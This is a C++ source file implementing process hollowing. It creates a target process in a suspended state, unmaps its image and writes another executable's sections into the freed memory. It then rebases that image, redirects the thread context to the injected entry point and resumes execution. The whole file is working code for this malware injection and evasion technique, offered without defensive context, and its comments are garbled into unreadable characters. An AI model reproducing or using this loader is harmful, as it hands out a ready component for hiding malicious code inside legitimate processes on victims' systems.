#include "stdafx.h"
#include <processthreadsapi.h>
#include "pe.h"
HANDLE CreateHollowedProcess(LPSTR lpCommandLine, LPSTR lpSourceFile)
{
	cout << "-->Creating Process." << endl;
	//ָ�����ڹ���վ�����棬��׼����Լ�����ʱ���������ڵ���۵Ľṹ��
	LPSTARTUPINFOA lpStartupInfo = new STARTUPINFOA();
	memset(lpStartupInfo, 0x00, sizeof(STARTUPINFOA));
	lpStartupInfo->cb = sizeof(STARTUPINFOA);
	LPPROCESS_INFORMATION lpProcessInformation = new PROCESS_INFORMATION();
	memset(lpProcessInformation, 0x00, sizeof(PROCESS_INFORMATION));
	HANDLE hProcess;
	CreateProcessA(NULL, 
		lpCommandLine, 
		NULL,
		NULL, 
		NULL, 
		CREATE_SUSPENDED, 
		NULL, 
		NULL, 
		lpStartupInfo, 
		lpProcessInformation
	);
	hProcess = lpProcessInformation->hProcess;
	cout << lpProcessInformation->dwProcessId << endl;
	if (!hProcess)
	{
		cout << "-->Create Process Failed." << endl;
		return hProcess;
	}
	_PPEB pPEB = ReadRemotePEB(hProcess);
	//PLOADED_IMAGE pImage = ReadRemoteImage(hProcess,pPEB->lpImageBaseAddress);
	cout << "-->Opening source image." << endl;
	HANDLE hFile = CreateFileA(lpSourceFile, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		cout << "-->Open EXE File Filed." << endl;
		return hProcess;
	}
	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, NULL);
	PLOADED_IMAGE pSourceImage = GetLoadedImage((ULONG_PTR)pBuffer);
	PIMAGE_NT_HEADERS pSourceHeader = pSourceImage->FileHeader;
	cout << "-->Unmapping Destination Section." << endl;
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	_NtUnmapViewOfSection NtUnmapViewSection = (_NtUnmapViewOfSection)GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
	DWORD dwResult = NtUnmapViewSection(lpProcessInformation->hProcess, pPEB->lpImageBaseAddress);
	if (dwResult)
	{
		cout << "-->Error Unmapping Section." << endl;
		return hProcess;
	}


	//���㾵���С
	DWORD lastSectionEnd = 0;//����+���ݳ��ȵĵ�ַ
	DWORD endOfSection = 0;
	SYSTEM_INFO sysInfo;
	DWORD alignedImageSize = 0;

	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pSourceHeader);
	//�ڵĶ�������
	DWORD optionoalSectionSize = pSourceHeader->OptionalHeader.SectionAlignment;
	for (int i = 0; i < (pSourceHeader->FileHeader.NumberOfSections); i++, section++)
	{
		//�������û�����ݣ�����һ��
		if (section->SizeOfRawData == 0)
			endOfSection = section->VirtualAddress + optionoalSectionSize;
		else
			endOfSection = section->VirtualAddress + (section->SizeOfRawData);
		if (endOfSection > lastSectionEnd)
			lastSectionEnd = endOfSection;
	}
	//ͨ��ϵͳ��Ϣ��ȡҳ���С
	GetNativeSystemInfo(&sysInfo);
	//���һ����ҳ�����
	alignedImageSize = AlignValueUp(lastSectionEnd, sysInfo.dwPageSize);
	if (alignedImageSize != AlignValueUp(lastSectionEnd, sysInfo.dwPageSize))
		return hProcess;
	cout << "-->Allocating Memory." << endl;
	LPVOID pRemoteImage = VirtualAllocEx
	(
		lpProcessInformation->hProcess,
		pPEB->lpImageBaseAddress,
		alignedImageSize,
		MEM_RESERVE,//�ο�Memory Module��ʽ
		PAGE_READWRITE
	);
	if (!pRemoteImage)
	{
		cout << "-->Allocate Memory Failed." << endl;
		cout << "-->Error Code:" << GetLastError() << endl;
		return hProcess;
	}
	//װ�ص�ַ��Ĭ�ϵ�ַ�Ĳ�ֵ
	ULONG_PTR upDelta = (ULONG_PTR)pPEB->lpImageBaseAddress - pSourceHeader->OptionalHeader.ImageBase;
	cout << hex << "Source Image BaseAddress:" << pSourceHeader->OptionalHeader.ImageBase << endl;
	cout << hex << "Destination Image BaseAddress:" << pPEB->lpImageBaseAddress << endl;
	cout << hex << "Relocation Delat:" << upDelta << endl;

	pSourceHeader->OptionalHeader.ImageBase = (ULONG_PTR)pPEB->lpImageBaseAddress;
	cout << "-->Writing Headers" << endl;

	//�ύ�ڴ�
	VirtualAllocEx
	(
		lpProcessInformation->hProcess,
		pPEB->lpImageBaseAddress,
		pSourceHeader->OptionalHeader.SizeOfHeaders,
		MEM_COMMIT,//�ο�Memory Module��ʽ
		PAGE_READWRITE
	);

	if (!WriteProcessMemory
	(
		lpProcessInformation->hProcess,
		pPEB->lpImageBaseAddress,
		pBuffer,
		pSourceHeader->OptionalHeader.SizeOfHeaders,
		NULL
	))
	{
		cout << "Writing Header Failed." << endl;
		return hProcess;
	}
	cout << "-->Writing Sections." << endl;
	if (!CopySections(hProcess, (ULONG_PTR)pPEB->lpImageBaseAddress, (ULONG_PTR)pBuffer))
	{
		cout << "Copy Secitons Failed." << endl;
		return hProcess;
	}
	cout << "-->Start Delta." << endl;
	//��ʼ�ض�λ
	if(upDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
		
			LPSTR pSectionName = ".reloc";
			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;
			cout << "-->Rebasing Image." << endl;
			//�ļ��е�ƫ��
			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;
			IMAGE_DATA_DIRECTORY relocData = pSourceHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
				//�ض�λ���е��ض�λ����
				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlockEntrys = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];
				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);
					//
					if (pBlockEntrys[y].Type == 0)
						continue;
					DWORD dwFieldAddress = pBlockheader->PageAddress + pBlockEntrys[y].Offset;
					ULONG_PTR upBuffer = 0;
					ReadProcessMemory
					(
						hProcess,
						(PVOID)((ULONG_PTR)pPEB->lpImageBaseAddress + dwFieldAddress),
						&upBuffer,
						sizeof(ULONG_PTR), 0
					);

					upBuffer += upDelta;
					bool bSuccess = WriteProcessMemory
					(
						hProcess,
						(PVOID)((ULONG_PTR)pPEB->lpImageBaseAddress + dwFieldAddress),
						&upBuffer,
						sizeof(ULONG_PTR),

						0
					);
					if (!bSuccess)
					{
						cout << "Failed to Rebase" << endl;
						continue;
					}
				}//end for
			}//end while

			break;
		}//end for
	if (!FinalizeSections(hProcess, (ULONG_PTR)pPEB->lpImageBaseAddress, (ULONG_PTR)pBuffer))
	{
		cout << "Finalize Section Failed." << endl;
		return hProcess;
	}
	DWORD dwBreakpoint = 0xCC;
	ULONG_PTR dwEntryPoint = (ULONG_PTR)pPEB->lpImageBaseAddress +
		pSourceHeader->OptionalHeader.AddressOfEntryPoint;
	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;
	cout << "-->Getting Thread Context." << endl;
	if (!GetThreadContext(lpProcessInformation->hThread, pContext))
	{
		cout << "Get Context Failed." << endl;
		return hProcess;
	}
#ifdef  _WIN64
	pContext->Rcx = dwEntryPoint;
#else
	pContext->Eax = dwEntryPoint;
#endif //  _WIN64
	cout << "Setting Thread Context." << endl;
	if (!SetThreadContext(lpProcessInformation->hThread, pContext))
	{
		cout << "Setting Context Failed." << endl;
		return hProcess;
	}
	cout << "Resuming Thread." << endl;
	if (!ResumeThread(lpProcessInformation->hThread))
	{
		cout << "Resume Thread Failed" << endl;
		return hProcess;
	}

	return hProcess;
}
